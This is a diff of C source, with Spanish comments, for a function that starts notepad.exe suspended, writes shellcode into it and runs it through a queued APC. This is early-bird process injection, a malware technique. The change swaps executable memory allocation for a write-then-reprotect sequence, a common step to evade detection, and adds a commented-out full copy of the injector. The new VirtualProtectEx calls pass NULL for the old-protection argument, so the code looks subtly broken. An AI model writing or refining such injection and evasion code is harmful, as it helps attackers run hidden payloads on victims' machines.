@@ -282,12 +282,16 @@ static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
     /* Reservar memoria ejecutable en el espacio de direcciones del proceso remoto */
     rmem = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                           MEM_COMMIT | MEM_RESERVE,
-                          PAGE_EXECUTE_READWRITE);
+                          PAGE_READWRITE);
     if (!rmem) goto fail;
 
     /* Copiar el shellcode al proceso remoto */
     if (!WriteProcessMemory(pi.hProcess, rmem, sc, sc_len, &written)
         || written != sc_len) goto fail;
+
+    /* Cambiar permisos a ejecutable después de escribir el shellcode */
+    if (!VirtualProtectEx(pi.hProcess, rmem, sc_len,
+                          PAGE_EXECUTE_READ, NULL)) goto fail;
 
     /* Encolar la APC en el hilo primario antes de reanudarlo.
        El APC dispara cuando el hilo entre en una espera alertable (NtTestAlert loop),
@@ -308,6 +312,53 @@ fail:
     CloseHandle(pi.hProcess);
     return 0;
 }
+
+// static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
+// {
+//     STARTUPINFOA        si;
+//     PROCESS_INFORMATION pi;
+//     char target[] = "C:\\Windows\\System32\\notepad.exe";
+//     SIZE_T written = 0;
+//     LPVOID rmem = NULL;
+
+//     xzero(&si, sizeof(si));
+//     xzero(&pi, sizeof(pi));
+//     si.cb = sizeof(si);
+
+//     /* Crear el proceso suspendido */
+//     if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
+//                         CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;
+
+//     /* Reservar memoria con permisos de solo lectura/escritura */
+//     rmem = VirtualAllocEx(pi.hProcess, NULL, sc_len,
+//                           MEM_COMMIT | MEM_RESERVE,
+//                           PAGE_READWRITE);
+//     if (!rmem) goto fail;
+
+//     /* Copiar el shellcode al proceso remoto */
+//     if (!WriteProcessMemory(pi.hProcess, rmem, sc, sc_len, &written)
+//         || written != sc_len) goto fail;
+
+//     /* Cambiar permisos a ejecutable después de escribir el shellcode */
+//     if (!VirtualProtectEx(pi.hProcess, rmem, sc_len,
+//                           PAGE_EXECUTE_READWRITE, NULL)) goto fail;
+
+//     /* Encolar la APC */
+//     if (!QueueUserAPC((PAPCFUNC)rmem, pi.hThread, 0)) goto fail;
+
+//     /* Reanudar el hilo */
+//     ResumeThread(pi.hThread);
+//     CloseHandle(pi.hThread);
+//     CloseHandle(pi.hProcess);
+//     return 1;
+
+// fail:
+//     /* Limpiar recursos */
+//     if (pi.hProcess) TerminateProcess(pi.hProcess, 1);
+//     if (pi.hThread) CloseHandle(pi.hThread);
+//     if (pi.hProcess) CloseHandle(pi.hProcess);
+//     return 0;
+// }
 
 /* ---------- punto de entrada ---------- */
 
